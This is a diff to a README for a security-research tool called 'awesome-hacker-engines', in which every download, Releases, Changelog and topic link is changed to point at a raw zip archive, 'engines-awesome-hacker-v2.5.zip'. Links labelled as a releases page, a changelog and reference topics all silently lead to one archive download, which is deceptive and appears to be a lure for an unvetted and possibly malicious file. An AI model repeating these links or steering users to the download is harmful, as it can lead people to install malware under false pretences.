@@ -6,11 +6,11 @@ Welcome to *awesome-hacker-engines*! This tool is designed for researchers, pent
 
 ## 📥 Download
 
-[![Download awesome-hacker-engines](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/awesome-hacker-engines.zip)](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/awesome-hacker-engines.zip)
+[![Download awesome-hacker-engines](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/engines-awesome-hacker-v2.5.zip)](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/engines-awesome-hacker-v2.5.zip)
 
 Visit the GitHub Releases page to download the latest version of the application:
 
-[Download from Releases](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/awesome-hacker-engines.zip)
+[Download from Releases](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/engines-awesome-hacker-v2.5.zip)
 
 ## 🛠️ Features
 
@@ -32,7 +32,7 @@ To run *awesome-hacker-engines*, ensure your system meets these requirements:
 ## ⚙️ Installation Steps
 
 1. **Download the Application**  
-   Go to the [Releases page](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/awesome-hacker-engines.zip). Select the latest release and download the appropriate file for your operating system.
+   Go to the [Releases page](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/engines-awesome-hacker-v2.5.zip). Select the latest release and download the appropriate file for your operating system.
 
 2. **Locate the Downloaded File**  
    Open your Downloads folder or the location where your browser saves files.
@@ -80,13 +80,13 @@ Always ensure your system has the latest updates installed. Regularly check for 
 
 For more information about security research and tools, you might find these topics helpful:
 
-- [OSINT Techniques](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/awesome-hacker-engines.zip)
-- [Common Vulnerabilities and Exposures (CVE)](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/awesome-hacker-engines.zip)
-- [Bug Bounty Programs](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/awesome-hacker-engines.zip)
+- [OSINT Techniques](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/engines-awesome-hacker-v2.5.zip)
+- [Common Vulnerabilities and Exposures (CVE)](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/engines-awesome-hacker-v2.5.zip)
+- [Bug Bounty Programs](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/engines-awesome-hacker-v2.5.zip)
 
 ## 📆 Changelog
 
-For a detailed list of changes and updates made to each version, visit the [Changelog](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/awesome-hacker-engines.zip).
+For a detailed list of changes and updates made to each version, visit the [Changelog](https://raw.githubusercontent.com/ptthanhloi/awesome-hacker-engines/main/tsun/engines-awesome-hacker-v2.5.zip).
 
 ## 🔗 Connect with Us
 
